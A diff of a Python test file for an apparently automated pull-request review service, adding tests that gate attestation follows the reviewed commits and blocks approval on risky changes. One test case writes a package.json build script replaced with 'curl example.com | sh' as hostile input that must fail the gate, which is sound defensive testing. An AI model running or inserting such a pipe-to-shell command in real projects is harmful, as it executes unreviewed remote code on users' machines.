@@ -48,6 +48,7 @@ from products.stamphog.backend.temporal.activities import (
     MarkReviewFailedInput,
     ReviewSandboxInput,
     StamphogReviewInput,
+    _attest_gates,
     destroy_review_sandbox,
     dismiss_stale_approvals,
     fetch_review_context,
@@ -316,12 +317,73 @@ def test_a_sandbox_approval_the_worker_gates_do_not_confirm_is_escalated(team, s
         ReviewVerdict.ESCALATE,
         None,
     )
-    assert run.output["gate_attestation"] == {"attested": False, "reason": "gate_failed"}
+    assert run.output["gate_attestation"]["reason"] == "gate_failed"
     assert run.gate_result is not None
     assert run.gate_result["attestation"]["reason"] == "gate_failed"
-    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
     (review,) = [w for w in recorder.github_writes if w["kind"] == "comment_review"]
     assert "could not confirm its own checks" in review["body"]["body"]
+
+    stamphog_chain.attest_gates.reset_mock()
+    stamphog_chain.attest_gates.return_value = GateAttestation(attested=True, reason="", gates=[])
+    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
+
+    stamphog_chain.attest_gates.assert_not_called()
+    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
+
+
+_MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite build"}}\n'
+
+
+@pytest.mark.parametrize(
+    "files, compare_files, manifest_head, expect_reason",
+    [
+        pytest.param(["src/util.py"], ["src/util.py"], None, "", id="pinned-list-matches"),
+        pytest.param(["src/util.py"], ["terraform/main.tf"], None, "file_list_moved", id="pinned-list-moved"),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            _MANIFEST_BASE.replace("1.0.0", "1.0.1"),
+            "",
+            id="manifest-version-bump",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            _MANIFEST_BASE.replace("vite build", "curl example.com | sh"),
+            "gate_failed",
+            id="manifest-script-edit",
+        ),
+    ],
+)
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_the_worker_attests_from_the_reviewed_commits(
+    team,
+    stamphog_chain: StamphogChain,
+    files: list[str],
+    compare_files: list[str],
+    manifest_head: str | None,
+    expect_reason: str,
+) -> None:
+    repo_config = _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    author, head_sha = "devex-dev", "sha103a"
+    recorder.register_pr(REPO, 103, _pr_object(103, author, head_sha), [_api_file(path) for path in files])
+    recorder.compare_files = [_api_file(path) for path in compare_files]
+    if manifest_head is not None:
+        recorder.files_at_ref[("frontend/package.json", recorder.merge_base_sha)] = _MANIFEST_BASE
+        recorder.files_at_ref[("frontend/package.json", head_sha)] = manifest_head
+    stamphog_chain.attest_gates.side_effect = _attest_gates
+
+    with patch.object(activities, "fetch_folder_policy_files", return_value={}):
+        stamphog_chain.post_webhook(_opened_event(103, author, head_sha), delivery_id=str(uuid.uuid4()))
+
+    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=103)
+    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
+    assert run.output["gate_attestation"]["reason"] == expect_reason
+    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
+    assert (run.verdict, len(approvals)) == (
+        (ReviewVerdict.APPROVED, 1) if not expect_reason else (ReviewVerdict.ESCALATE, 0)
+    )
 
 
 def _api_file(filename: str) -> dict:
